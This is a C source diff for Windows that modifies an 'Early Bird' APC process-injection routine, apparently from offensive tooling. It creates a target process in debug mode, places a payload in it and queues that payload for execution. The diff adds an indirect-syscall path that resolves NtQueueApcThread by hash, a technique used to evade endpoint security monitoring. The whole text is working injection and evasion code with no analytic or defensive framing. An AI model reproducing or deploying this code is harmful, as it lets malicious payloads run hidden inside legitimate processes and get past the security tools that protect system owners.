@@ -16,15 +16,15 @@ BOOL CreateSuspendedProcess(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
     WCHAR lpPath[MAX_PATH * 2];
     WCHAR WnDr[MAX_PATH];
 
-    STARTUPINFO Si = { 0 };
+    STARTUPINFOW Si = { 0 };
     PROCESS_INFORMATION Pi = { 0 };
 
     // Cleaning the structs
-    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
+    RtlSecureZeroMemory(&Si, sizeof(STARTUPINFOW));
     RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
 
     // Setting the size of the structure
-    Si.cb = sizeof(STARTUPINFO);
+    Si.cb = sizeof(STARTUPINFOW);
 
     // Creating the target process path
     wcscpy_s(lpPath, MAX_PATH * 2, lpProcessName);
@@ -60,16 +60,18 @@ BOOL CreateSuspendedProcess(LPWSTR lpProcessName, DWORD* dwProcessId, HANDLE* hP
 }
 
 BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName, PBYTE pPayload, SIZE_T sPayloadSize) {
-	DWORD		dwProcessId		= NULL;
+	DWORD		dwProcessId		= 0;
 	PVOID		pAddress		= NULL;
 
 
 //	creating target remote process (in debugged state)
 	DebugPrint("[i] Creating \"%ls\" Process As A Debugged Process ...\n", szProcessName);
 
-	if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread)) {
+
+    if (!CreateSuspendedProcess(szProcessName, &dwProcessId, &hProcess, &hThread)) {
 		return FALSE;
 	}
+
 	DebugPrint("\t[i] Target Process Created With Pid : %d \n", dwProcessId);
 	DebugPrint("[+] DONE \n\n");
 
@@ -82,7 +84,19 @@ BOOL EarlyBirdApcInjection(HANDLE hProcess, HANDLE hThread, LPWSTR szProcessName
 	DebugPrint("[+] DONE \n\n");
 
 //	running QueueUserAPC
-	QueueUserAPC((PTHREAD_START_ROUTINE)pAddress, hThread, NULL);
+#ifdef HW_INDIRECT_SYSCALL
+    NTSTATUS		STATUS = STATUS_SUCCESS;
+
+    // executing the payload via NtQueueApcThread
+    NtQueueApcThread_t pNtQueueApcThread = (NtQueueApcThread_t)PrepareSyscallHash(NtQueueApcThread_JOAA);
+    if ((STATUS = pNtQueueApcThread(hThread, pAddress, NULL, NULL, 0)) != 0) {
+        DebugPrint("[!] NtQueueApcThread Failed With Error : 0x%0.8X \n", STATUS);
+        return FALSE;
+    }
+    DebugPrint("[+] DONE \n");
+#else
+	QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL);
+#endif
 
 //	since 'CreateSuspendedProcess2' create a process in debug mode,
 //	we need to 'Detach' to resume execution; we do using `DebugActiveProcessStop`   
